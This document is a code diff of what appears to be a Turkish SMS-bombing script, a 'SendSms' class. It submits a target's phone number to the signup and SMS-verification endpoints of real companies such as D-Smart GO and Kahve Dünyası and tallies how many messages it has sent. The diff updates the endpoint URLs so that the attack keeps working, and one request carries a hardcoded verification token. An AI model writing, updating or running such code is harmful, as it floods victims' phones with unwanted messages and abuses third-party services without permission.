@@ -66,7 +66,7 @@ class SendSms():
 
             if numara != "bos":
 
-                    dsmartgo = requests.post("https://www.dsmartgo.com.tr/web/account/checkphonenumber", data={
+                    dsmartgo = requests.post("https://www.dsmartgo.com.tr/uye-ol", data={
 
         	        "__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41",
 
@@ -204,7 +204,7 @@ class SendSms():
 
                 try:
 
-                    kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={
+                    kahve_dunyasi = requests.post("https://www.kahvedunyasi.com/kayit-ol", data={
 
                     "mobile_number": numara,
 
@@ -214,7 +214,7 @@ class SendSms():
 
                     if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
 
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> core.kahvedunyasi.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> kahvedunyasi.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
 
                         self.adet += 1
 
@@ -226,7 +226,7 @@ class SendSms():
 
                 except:
 
-                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> core.kahvedunyasi.com "+numara)
+                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> kahvedunyasi.com "+numara)
 
                 uygulanan_nolar += 1
 
